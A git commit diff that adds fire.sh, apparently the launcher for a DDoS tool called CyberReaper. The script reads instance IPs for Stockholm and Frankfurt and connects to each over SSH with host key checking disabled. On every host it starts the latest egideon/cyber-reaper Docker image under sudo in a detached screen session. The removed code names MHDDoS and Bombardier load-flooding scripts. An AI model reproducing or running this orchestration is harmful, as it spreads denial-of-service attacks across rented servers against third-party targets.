42fd647e7317dab56ab36205ab511f4805918043
Alex Ander <alex.ander@oracle.com>
2022-03-20 22:58:36 +0100

    Introduced the brand new fire tool
    See https://github.com/E-Gideon/CyberReaper for details

--- fire.sh
+++ fire.sh
@@ -1,6 +1,54 @@
 #!/bin/bash
 
-COLOR_RED=$'\e[1;31m'
-RESET_COLOR=$'\e[0m'
+main(){
+	local COLOR_GREEN=$'\e[1;32m'
+	local RESET_COLOR=$'\e[0m'
+	echo "${COLOR_GREEN}Firing via CyberReaper...${RESET_COLOR}"
+	./watchForInstancesStart.sh &&
+	./watchForSSHStart.sh || exit 1
 
-echo "⚠️  ${COLOR_RED}Use ./fireBombardier.sh or ./fireMHDDoS.sh${RESET_COLOR}"
+	fireFromStockholm &
+	fireFromFrankfurt &
+	wait
+}
+
+fireFromStockholm(){
+	local STOCKHOLM_INSTANCES_IPS=`./getInstancesIPs.sh -s`
+
+	for ip in ${STOCKHOLM_INSTANCES_IPS}
+	do
+		fire "key-stockholm-0.pem" ${ip} &
+	done
+	wait
+}
+
+fireFromFrankfurt(){
+	local FRANKFURT_INSTANCES_IPS=`./getInstancesIPs.sh -f`
+
+	for ip in ${FRANKFURT_INSTANCES_IPS}
+	do
+		fire "key-frankfurt-0.pem" ${ip} &
+	done
+	wait
+}
+
+fire(){
+	local KEY=${1}
+	local IP=${2}
+	shift 2
+
+	echo "    🔥 ${IP}"
+	ssh \
+		-i ${KEY} \
+		-o "LogLevel ERROR" \
+		-o "IdentitiesOnly yes" \
+		-o "StrictHostKeyChecking no" \
+		-o "UserKnownHostsFile /dev/null" \
+		"ubuntu@${IP}" \
+			screen -dm \
+				sudo docker run \
+				--rm \
+				--pull always egideon/cyber-reaper:latest
+}
+
+main
